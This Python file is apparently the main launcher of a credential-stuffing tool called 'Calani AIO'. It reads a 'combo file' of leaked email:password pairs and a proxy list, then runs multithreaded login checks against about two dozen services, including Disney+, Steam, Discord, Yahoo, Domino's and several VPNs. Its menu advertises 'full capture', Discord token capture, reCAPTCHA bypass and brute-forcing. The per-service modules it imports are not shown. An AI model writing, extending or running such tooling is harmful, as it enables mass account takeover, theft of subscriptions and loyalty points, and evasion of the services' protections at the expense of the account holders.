from modules.variables import Checker, discord
from modules.functions import *
from time import sleep
from multiprocessing.dummy import Pool
from threading import Thread

from modules.checkers import nordvpn
from modules.checkers import bonk_io
from modules.checkers import disney
from modules.checkers import duolingo
from modules.checkers import gfuel
from modules.checkers import crunchyroll
from modules.checkers import spotifyvm
from modules.checkers import bww
from modules.checkers import pornhub
from modules.checkers import honeygain
from modules.checkers import discordvm
from modules.checkers import discord_solver
from modules.checkers import steam
from modules.checkers import windscribe
from modules.checkers import instagram
from modules.checkers import uplay
from modules.checkers import paramount
from modules.checkers import ipvanish
from modules.checkers import tunnelbear
from modules.checkers import plextv
from modules.checkers import origin
from modules.checkers import yahoo
from modules.checkers import dominos
from modules.checkers import dickeys

modules_list = {
    "disney+ [full capture | us proxies]":disney,
    "plextv [subscription capture]":plextv,
    "duolingo [full capture]":duolingo,
    "gfuel [full capture]":gfuel,
    "crunchyroll [subscription capture]":crunchyroll,
    "spotify [valid mail]":spotifyvm,
    "bww [points capture | proxyless]":bww,
    "dominos [points capture | recaptcha v3 bypass]":dominos,
    "dickeys [points capture]":dickeys,
    "pornhub [subscription capture]":pornhub,
    "honeygain [credits capture]":honeygain,
    'yahoo [brute]':yahoo,
    "discord [token capture | solver]":discord_solver,
    "discord [valid mail]":discordvm,
    "instagram [followers capture]":instagram,
    "bonk.io [full capture]":bonk_io,
    "uplay [full capture]":uplay,
    "origin [full capture]":origin,
    "steam [full capture]":steam,
    "paramount [full capture]":paramount,
    "nordvpn [subscription capture]":nordvpn,
    "windscribe [subscription capture]":windscribe,
    "ipvanish [subscription capture]":ipvanish,
    "tunnelbear [subscription capture]":tunnelbear,
}

def starter(modules_lst:list):
    """Starts checking accounts"""
    reset_stats()
    set_title(f"Calani AIO | Getting Ready | {discord}")
    def initializeChecker(account:str):
        if ':' in account:
            email,password = account.split(":")
            if email and password:
                for module in modules_lst:
                    modules_list[module].check(email,password)
                    Checker.cpm += 60
                Checker.remaining.remove(account)
                return
        
        Checker.cpm += 60
        Checker.bad += 1
        

    clear()
    ascii()
    print("\n\n")
    print(f"    [{cyan}>{reset}] Pick Combo File")
    sleep(1)
    file_path = get_file("Combo File",type="Combo File")
    if not file_path:
        print(f"    [{red}>{reset}] No File Detected")
        sleep(1)
        return
    with open(file_path,errors="ignore") as file:
        before_accounts = file.read().splitlines()
        after_accounts = list(set(before_accounts))
        Checker.accounts = after_accounts.copy()
        Checker.remaining = after_accounts.copy()
        Checker.total_accounts = len(Checker.accounts)
        duplicates = len(before_accounts)-len(after_accounts)
    if not after_accounts:
        print(f"    [{red}>{reset}] No Accounts Detected")
        sleep(1)
        return
    print(f"    [{cyan}>{reset}] Imported {green}{len(before_accounts)}{reset} Accounts")
    if duplicates != 0:
        print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
    sleep(1)

    print("\n")

    print(f"    [{cyan}>{reset}] Pick Proxy File")
    sleep(1)
    file_path = get_file("Proxy File File",type="Proxy File")
    if not file_path:
        print(f"    [{red}>{reset}] No File Detected")
        sleep(1)
        return
    with open(file_path,errors="ignore") as file:
        before_proxies = file.read().splitlines()
        after_proxies = list(set(before_proxies))
        Checker.proxies = after_proxies
        Checker.total_proxies = len(Checker.proxies)
        duplicates = len(before_proxies)-len(after_proxies)
    if not after_proxies:
        print(f"    [{red}>{reset}] No Proxies Detected")
        sleep(1)
        return
    print(f"    [{cyan}>{reset}] Imported {green}{len(before_proxies)}{reset} Proxies")
    if duplicates != 0:
        print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
    sleep(1)

    Checker.checking = True
    Checker.time = get_time()
    makedirs(f"Results/{Checker.time}",exist_ok=True)

    Thread(target=title,args=(len(modules_lst),),daemon=True).start()
    Thread(target=level_cpm,daemon=True).start()

    clear()
    if not Checker.cui:
        ascii()
        print("\n\n")
    else: Thread(target=cui,args=(len(modules_lst),),daemon=True).start()
    if Checker.total_proxies > Checker.threads: Checker.lockProxies = True
    mainpool = Pool(processes=Checker.threads)
    mainpool.imap_unordered(func=initializeChecker,iterable=Checker.accounts)
    mainpool.close()
    mainpool.join()
    sleep(5)
    Checker.checking = False
    print("\n\n")
    print(f"    [{cyan}>{reset}] Finished Checking")
    input(f"    [{cyan}>{reset}] Press Enter To Go Back")
